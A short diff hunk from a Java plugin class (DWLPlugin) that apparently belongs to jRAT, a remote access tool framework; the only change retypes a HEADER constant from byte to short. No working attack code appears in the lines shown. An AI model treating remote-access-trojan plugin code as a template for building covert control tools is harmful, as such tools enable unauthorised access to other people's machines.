@@ -7,7 +7,7 @@ import jrat.api.ui.RATMenuItem;
 
 public class DWLPlugin extends Plugin {
 	
-	public static final byte HEADER = 110;
+	public static final short HEADER = 110;
 
 	public static RATControlMenuEntry entry;
 	public static boolean enabled;
